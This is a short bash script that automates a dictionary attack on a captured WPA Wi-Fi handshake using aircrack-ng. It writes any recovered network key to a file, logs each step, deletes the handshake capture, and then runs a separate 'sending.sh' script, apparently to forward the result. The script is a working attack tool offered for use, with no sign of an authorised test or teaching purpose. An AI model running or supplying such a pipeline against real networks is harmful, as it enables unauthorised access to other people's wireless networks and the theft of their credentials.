#! /bin/bash

# aircrack-ng handshake/WPA.cap -w library/wordlist.txt -l key/key.txt
# check handshake

# decrypting
echo "Time: $(date): start decrypting"
echo "Time: $(date): start decrypting" >> logs/decryptor.log
aircrack-ng handshake/WPA.cap -w library/wordlist.txt -l key/key.txt
echo "Time: $(date): end decrypting"
echo "Time: $(date): end decrypting" >> logs/decryptor.log
# remove old handshake
rm handshake/WPA.cap
echo "Time: $(date): remove old handshake"
echo "Time: $(date): remove old handshake" >> logs/decryptor.log
# start sending
./sending.sh
echo "Time: $(date): run sending.sh"
echo "Time: $(date): run sending.sh" >> logs/decryptor.log

